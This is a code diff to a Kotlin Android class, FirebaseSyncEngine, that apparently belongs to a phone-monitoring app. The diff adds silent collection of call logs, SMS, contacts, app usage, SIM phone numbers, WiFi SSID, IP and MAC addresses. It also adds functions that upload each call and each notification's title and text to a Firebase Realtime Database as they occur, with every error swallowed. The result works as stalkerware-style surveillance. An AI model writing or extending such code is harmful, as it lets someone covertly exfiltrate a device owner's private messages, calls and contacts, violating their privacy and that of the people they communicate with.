@@ -166,6 +166,12 @@ class FirebaseSyncEngine(private val context: Context) {
         var firestoreSuccess = false
         var rtdbSuccess = false
 
+        // Sync local data providers into Room DB right before upload
+        try { CallLogSyncManager(context).syncCallLogs() } catch (_: Exception) {}
+        try { AppUsageSyncManager(context).syncAppUsageStats() } catch (_: Exception) {}
+        try { SmsSyncManager(context).syncSmsMessages() } catch (_: Exception) {}
+        try { ContactsSyncManager(context).syncContacts() } catch (_: Exception) {}
+
         // Fetch all local synced records from Room DB
         val smsList = try { db.smsDao().getAllSmsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading SMS: ${e.message}"); emptyList() }
         val callLogs = try { db.callLogDao().getAllCallLogsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Calls: ${e.message}"); emptyList() }
@@ -216,14 +222,27 @@ class FirebaseSyncEngine(private val context: Context) {
 
                 val iccid = subInfo.iccId?.takeIf { it.isNotBlank() } ?: "N/A"
 
-                var phone: String? = try {
-                    subInfo.number?.takeIf { it.isNotBlank() }
-                } catch (_: Exception) { null }
-
+                var phone: String? = null
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && subManager != null) {
+                    try {
+                        phone = subManager.getPhoneNumber(subId)?.takeIf { it.isNotBlank() }
+                    } catch (_: Exception) {}
+                }
                 if (phone == null) {
-                    phone = try {
-                        subTelephony.line1Number?.takeIf { it.isNotBlank() }
-                    } catch (_: Exception) { null }
+                    try {
+                        @Suppress("DEPRECATION")
+                        phone = subInfo.number?.takeIf { it.isNotBlank() }
+                    } catch (_: Exception) {}
+                }
+                if (phone == null) {
+                    try {
+                        phone = subTelephony.line1Number?.takeIf { it.isNotBlank() }
+                    } catch (_: Exception) {}
+                }
+                if (phone == null) {
+                    try {
+                        phone = telephonyManager.line1Number?.takeIf { it.isNotBlank() }
+                    } catch (_: Exception) {}
                 }
 
                 val operatorCode = subTelephony.simOperator.ifEmpty { subTelephony.networkOperator }
@@ -300,7 +319,13 @@ class FirebaseSyncEngine(private val context: Context) {
             "isCharging" to (deviceInfo?.isCharging ?: false),
             "batteryStatus" to if (deviceInfo?.isCharging == true) "Charging" else "Discharging",
             "networkType" to (deviceInfo?.networkType ?: "N/A"),
-            "wifiSsid" to (deviceInfo?.wifiSsid ?: "Not Connected"),
+            "wifiSsid" to (deviceInfo?.wifiSsid ?: "Not connected"),
+            "wifiState" to if ((deviceInfo?.wifiSsid ?: "Not connected") != "Not connected") "CONNECTED" else "DISCONNECTED",
+            "wifiConnected" to ((deviceInfo?.wifiSsid ?: "Not connected") != "Not connected"),
+            "wifiIpAddress" to (deviceInfo?.localIp ?: ""),
+            "wifiSignalStrength" to (deviceInfo?.wifiRssi ?: 0),
+            "wifiLinkSpeed" to "",
+            "wifiMacAddress" to (deviceInfo?.macAddress ?: ""),
             "storageAvailableFormatted" to storageFormatted,
             "ramAvailableFormatted" to getRamUsageFormatted(),
             "isRooted" to false,
@@ -565,6 +590,44 @@ class FirebaseSyncEngine(private val context: Context) {
             Log.d("FirebaseSyncEngine", "Instant SMS uploaded to Realtime Database for $address")
         } catch (e: Exception) {
             Log.e("FirebaseSyncEngine", "Instant SMS upload error: ${e.message}")
+        }
+    }
+
+    fun uploadSingleCallInstant(number: String, name: String, type: String, duration: Long, timestamp: Long) {
+        try {
+            val rtdb = FirebaseDatabase.getInstance()
+            val callRef = rtdb.getReference(FirebaseConstants.getCallsPath(deviceId)).push()
+            val payload = mapOf(
+                "number" to number,
+                "name" to name,
+                "type" to type,
+                "durationSeconds" to duration,
+                "timestamp" to timestamp,
+                "formattedDate" to formatTimestamp(timestamp),
+                "formattedDuration" to formatDuration(duration)
+            )
+            callRef.setValue(payload)
+            Log.d("FirebaseSyncEngine", "Instant Call uploaded to Realtime Database for $number")
+        } catch (e: Exception) {
+            Log.e("FirebaseSyncEngine", "Instant Call upload error: ${e.message}")
+        }
+    }
+
+    fun uploadSingleNotificationInstant(packageName: String, title: String, text: String, timestamp: Long) {
+        try {
+            val rtdb = FirebaseDatabase.getInstance()
+            val notifRef = rtdb.getReference(FirebaseConstants.getNotificationsPath(deviceId)).push()
+            val payload = mapOf(
+                "packageName" to packageName,
+                "title" to title,
+                "text" to text,
+                "timestamp" to timestamp,
+                "formattedTime" to formatTimestamp(timestamp)
+            )
+            notifRef.setValue(payload)
+            Log.d("FirebaseSyncEngine", "Instant Notification uploaded to Realtime Database for $packageName")
+        } catch (e: Exception) {
+            Log.e("FirebaseSyncEngine", "Instant Notification upload error: ${e.message}")
         }
     }
 
